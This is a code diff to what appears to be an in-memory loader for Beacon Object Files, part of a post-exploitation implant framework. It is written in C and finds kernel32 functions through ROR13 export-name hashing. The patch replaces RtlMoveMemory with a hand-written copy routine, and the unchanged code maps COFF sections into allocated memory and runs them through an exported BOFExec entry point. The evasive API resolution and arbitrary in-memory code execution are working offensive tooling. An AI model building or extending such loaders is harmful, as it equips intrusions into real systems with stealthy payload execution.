@@ -67,7 +67,15 @@ typedef int   __stdcall (*pfn_VirtualProtect)(void *addr, uint32_t size, uint32_
 typedef void *__stdcall (*pfn_GetProcessHeap)(void);
 typedef void *__stdcall (*pfn_HeapAlloc)(void *heap, uint32_t flags, uint32_t bytes);
 typedef int   __stdcall (*pfn_HeapFree)(void *heap, uint32_t flags, void *mem);
-typedef void  __stdcall (*pfn_RtlMoveMemory)(void *dst, const void *src, uint32_t len);
+
+/* Note: RtlMoveMemory is intentionally NOT resolved through
+ * kernel32. On Windows 7+ kernel32 exports RtlMoveMemory as a
+ * forwarder to ntdll.RtlMoveMemory — our ROR13 walker would
+ * return the forwarder string's address, not executable code,
+ * and calling it crashes inside the WoW64 helper. We use the
+ * tiny loader_memcpy primitive below instead. See
+ * win/api/resolve_windows.go:91 for the parent-side counterpart
+ * that DOES follow forwarders; the loader chooses simplicity. */
 
 typedef struct {
     pfn_ExitThread      ExitThread;
@@ -76,8 +84,16 @@ typedef struct {
     pfn_GetProcessHeap  GetProcessHeap;
     pfn_HeapAlloc       HeapAlloc;
     pfn_HeapFree        HeapFree;
-    pfn_RtlMoveMemory   RtlMoveMemory;
 } kernel32_api_t;
+
+/* loader_memcpy — byte-wise copy used for COFF section data and
+ * Beacon output buffers. Tiny and forwarder-immune. */
+static void loader_memcpy(void *dst, const void *src, uint32_t n)
+{
+    uint8_t *d = (uint8_t *)dst;
+    const uint8_t *s = (const uint8_t *)src;
+    for (uint32_t i = 0; i < n; i++) d[i] = s[i];
+}
 
 static kernel32_api_t g_kapi;
 
@@ -89,7 +105,6 @@ static kernel32_api_t g_kapi;
 #define HASH_GET_PROCESS_HEAP     0xA80EECAEu
 #define HASH_HEAP_ALLOC           0x2500383Cu
 #define HASH_HEAP_FREE            0x10C32616u
-#define HASH_RTL_MOVE_MEMORY      0xCF14E85Bu
 
 static uint32_t ror13_hash(const uint8_t *s)
 {
@@ -148,10 +163,8 @@ static int resolve_kapi(uint32_t k32, kernel32_api_t *k)
     k->GetProcessHeap = (pfn_GetProcessHeap)resolve_by_hash(k32, HASH_GET_PROCESS_HEAP);
     k->HeapAlloc      = (pfn_HeapAlloc)     resolve_by_hash(k32, HASH_HEAP_ALLOC);
     k->HeapFree       = (pfn_HeapFree)      resolve_by_hash(k32, HASH_HEAP_FREE);
-    k->RtlMoveMemory  = (pfn_RtlMoveMemory) resolve_by_hash(k32, HASH_RTL_MOVE_MEMORY);
     return k->ExitThread && k->VirtualAlloc && k->VirtualProtect
-        && k->GetProcessHeap && k->HeapAlloc && k->HeapFree
-        && k->RtlMoveMemory;
+        && k->GetProcessHeap && k->HeapAlloc && k->HeapFree;
 }
 
 /* — Beacon API surface (step 1.c minimal) ------------------------- */
@@ -175,7 +188,7 @@ static void append_out(const void *src, uint32_t n)
     uint32_t room = g_params->out_cap - g_params->out_len;
     if (room == 0) return;
     if (n > room) n = room;
-    g_kapi.RtlMoveMemory((uint8_t *)(g_params->out_addr + g_params->out_len), src, n);
+    loader_memcpy((uint8_t *)(g_params->out_addr + g_params->out_len), src, n);
     g_params->out_len += n;
 }
 
@@ -185,7 +198,7 @@ static void append_err(const void *src, uint32_t n)
     uint32_t room = g_params->err_cap - g_params->err_len;
     if (room == 0) return;
     if (n > room) n = room;
-    g_kapi.RtlMoveMemory((uint8_t *)(g_params->err_addr + g_params->err_len), src, n);
+    loader_memcpy((uint8_t *)(g_params->err_addr + g_params->err_len), src, n);
     g_params->err_len += n;
 }
 
@@ -411,7 +424,6 @@ static uint32_t exec_bof(loader_params_t *p)
         p->error_code = 0x10005;
         return LOADER_STATUS_LOAD_FAIL;
     }
-
     uint8_t *mapping = (uint8_t *)g_kapi.VirtualAlloc(
         0, total, /* MEM_COMMIT|MEM_RESERVE */ 0x3000,
         /* PAGE_READWRITE */ 0x04);
@@ -434,7 +446,7 @@ static uint32_t exec_bof(loader_params_t *p)
             p->error_code = 0x10007;
             return LOADER_STATUS_LOAD_FAIL;
         }
-        g_kapi.RtlMoveMemory(mapping + cursor, bof + raw_ptr, raw_size);
+        loader_memcpy(mapping + cursor, bof + raw_ptr, raw_size);
         section_base[i + 1] = (uint32_t)(mapping + cursor);
         section_exec[i + 1] = (chars & IMAGE_SCN_MEM_EXECUTE) ? 1 : 0;
         cursor += raw_size;
@@ -588,7 +600,6 @@ __declspec(dllexport) uint32_t __stdcall BOFExec(loader_params_t *p)
 
     uint32_t result = exec_bof(p);
     p->status = result;
-
     g_kapi.ExitThread(result);
     return result;  /* unreachable */
 }
